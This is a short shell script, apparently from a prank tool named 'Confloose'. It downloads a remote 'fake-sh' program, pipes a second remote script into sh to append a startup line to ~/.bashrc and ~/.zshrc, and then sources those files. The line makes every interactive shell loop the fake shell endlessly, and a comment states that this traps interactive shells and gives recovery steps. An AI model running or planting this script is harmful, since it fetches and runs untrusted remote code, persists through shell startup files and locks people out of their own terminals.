#!/bin/sh

tempdir=$(mktemp -d)

curl -fsSL "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/fake-sh/sh.sh" > "$tempdir/sh" || { rm -rf "$tempdir"; exit 1; }
chmod +x "$tempdir/sh"

# Recovery (this traps interactive shells): run `bash --noprofile --norc -c 'sed -i "/confloose by leo \[fake-sh\]/d" ~/.bashrc ~/.zshrc'`
# from a non-interactive shell, a GUI editor, or ssh with a command.
echo $(curl -fsSL "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/bashrc_confloose_base.sh") "fake-sh" "'if [ -n \"\$PS1\" ]; then while true; do $tempdir/sh; done; fi'" | sh
for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null; done
